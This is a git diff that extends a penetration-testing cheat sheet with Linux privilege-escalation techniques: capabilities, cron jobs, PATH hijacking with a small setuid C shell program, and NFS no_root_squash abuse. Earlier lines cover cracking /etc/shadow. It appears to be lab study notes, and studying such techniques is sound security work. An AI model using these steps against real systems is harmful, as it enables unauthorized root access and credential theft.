@@ -88,12 +88,12 @@ Function Shortcut
 # Privilege Escalation: Sudo
 
   - sudo -l: `Check root privilages`
-  - GTFObin: https://gtfobins.github.io/
+  - GTFObins: https://gtfobins.github.io/
 
 # Privilege Escalation: SUID
 
   - find / -type f -perm -04000 -ls 2>/dev/null: `list files that have SUID or SGID bits set.`
-  - GTFObin: https://gtfobins.github.io/
+  - GTFObins: https://gtfobins.github.io/
 - *If you can view /etc/shadow and /etc/passwd, can copy to attacker machine and use JohnTheRipper to find credentials*
   - unshadow passwd.txt shadow.txt > passwords.txt
 - *If you can write to /etc/passwd*
@@ -101,3 +101,48 @@ Function Shortcut
   - add "root:/bin/bash" to end of user in /etc/passwd
 
 # Privilege Escalation: Capabilities
+
+  - getcap -r / 2>/dev/null: `list enabled capabilities.`
+  - GTFObins: https://gtfobins.github.io/
+
+# Privilege Escalation: Cron Jobs
+
+  - /etc/crontab: `read the file keeping system-wide cron jobs`
+- *See if any files can be edited, to run a payload or start a reverse shell*
+
+# Privilege Escalation: PATH
+
+  - echo $PATH: `Show the PATH variable`
+  1. What folders are located under $PATH
+  2. Does your current user have write privileges for any of these folders?
+  3. Can you modify $PATH?
+  4. Is there a script/application you can start that will be affected by this vulnerability?
+---------------------------
+  path_exp.c:
+  #include <unistd.h>
+  void main()
+  {
+  setuid(0);
+  setgid(0);
+  system(thm); `any binary that will run /bin/bash`
+  }
+---------------------------
+  - gcc path_exp.c -o path -w `compile the C script`
+  - chmod u+s path
+  - find / -writable 2>/dev/null: `search for writable folders`
+- *if able to, add path to the $PATH env variable*
+  - export PATH=/tmp:$PATH `replace {/tmp} with the path to add`
+
+# Privilege Escalation: NFS
+
+  - /etc/exports `List NFS (Network File Sharing) configuration. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.`
+- *On attacker machine*
+  - showmount -e <target-IP>
+  - mkdir /tmp/backuponAttackerMachine
+  - mount -o rw <target-IP>:<NFS-file> /tmp/backuponAttackerMachine `mount -o rw 10.10.10.19:/backups /tmp/backuponAttackerMachine.`
+  - nano nfs.c `spawn a /bin/bash shell`
+  - gcc nfs.c -o nfs -w `compile nfs.c`
+  - chmod +s nfs  
+  
+# Windows Privilage Escalation
+ 
